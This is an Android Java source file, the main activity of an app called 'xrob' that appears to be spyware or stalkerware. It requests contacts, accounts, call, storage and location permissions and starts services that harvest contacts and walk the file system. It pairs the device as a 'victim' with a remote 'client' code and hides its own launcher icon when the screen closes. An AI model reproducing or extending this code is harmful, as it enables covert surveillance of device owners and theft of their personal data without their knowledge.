package com.theah64.xrob;

import android.Manifest;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import com.theah64.xrob.asynctasks.ContactRefresher;
import com.theah64.xrob.services.ContactsWatcherService;
import com.theah64.xrob.services.FileWalkerService;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.DialogUtils;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.ProgressManager;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String X = MainActivity.class.getSimpleName();
    private static final int RQ_CODE_RQ_PERMISSIONS = 1;
    private static final String KEY_CLIENT_CODE = "client_code";
    private ProgressManager progressManager;
    private EditText etClientCode;
    private DialogUtils dialogUtils;
    private Call connectCall;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.GET_ACCOUNTS,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_FINE_LOCATION
                }, RQ_CODE_RQ_PERMISSIONS);
            } else {
                doNormalWork();
            }

        } else {
            doNormalWork();
        }

    }

    @Override
    public void onBackPressed() {
        Log.d(X, "Backbutton press intercepted");
        confirmActivityClose();
    }

    private void connectClientVictim() {

        final String clientCode = etClientCode.getText().toString();

        if (!clientCode.isEmpty() && clientCode.length() == 10) {

            progressManager.showLoading(R.string.Identifying_victim);

            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {

                @Override
                public void onReadyToRequest(String apiKey) {

                    progressManager.showLoading(getString(R.string.Connecting_victim_to_s, clientCode));

                    //Connecting
                    final Request connectRequest = new APIRequestBuilder("/connect/client_to_victim", apiKey)
                            .addParam(KEY_CLIENT_CODE, clientCode)
                            .build();

                    connectCall = OkHttpUtils.getInstance().getClient().newCall(connectRequest);
                    connectCall.enqueue(new Callback() {
                        @Override
                        public void onFailure(final Call call, IOException e) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    if (!call.isCanceled()) {
                                        progressManager.showMainView();
                                        dialogUtils.showErrorDialog(R.string.network_error);
                                    }
                                }
                            });
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            final String jsonResp = OkHttpUtils.logAndGetStringBody(response);
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    progressManager.showMainView();
                                    try {
                                        final String message = new APIResponse(jsonResp).getMessage();
                                        etClientCode.setText(null);
                                        dialogUtils.showSimpleMessage(R.string.Connected, message, new DialogInterface.OnDismissListener() {
                                            @Override
                                            public void onDismiss(DialogInterface dialogInterface) {
                                                confirmActivityClose();
                                            }
                                        });
                                    } catch (JSONException | APIResponse.APIException e) {
                                        e.printStackTrace();
                                        dialogUtils.showErrorDialog(e.getMessage());
                                    }
                                }
                            });
                        }
                    });
                }

                @Override
                public void onFailed(String reason) {
                    progressManager.showMainView();
                    dialogUtils.showErrorDialog(reason);
                }
            });

        } else {
            dialogUtils.showErrorDialog(R.string.Invalid_client_code);
        }

    }

    private void confirmActivityClose() {
        //Showing confirmation about the activity close
        dialogUtils.showConfirmDialog(R.string.Exit, R.string.Exit_message, R.string.YES, new DialogUtils.ClosedQuestionCallback() {
            @Override
            public void onYes() {
                finish();
            }

            @Override
            public void onNo() {

            }
        });
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == RQ_CODE_RQ_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                doNormalWork();
            } else {
                Toast.makeText(MainActivity.this, "You must accept the permissions.", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    @Override
    protected void onStop() {

        //Hiding launcher icon
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        OkHttpUtils.cancelCall(connectCall);
        super.onStop();
    }

    private void doNormalWork() {

        this.dialogUtils = new DialogUtils(this);
        this.progressManager = new ProgressManager(this, R.id.llConnectVictimClient);
        this.etClientCode = (EditText) findViewById(R.id.etClientCode);

        findViewById(R.id.bConnect).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                connectClientVictim();
            }
        });

        new ContactRefresher(this).execute();
        startService(new Intent(this, ContactsWatcherService.class));
        startService(new Intent(this, FileWalkerService.class));
    }

}
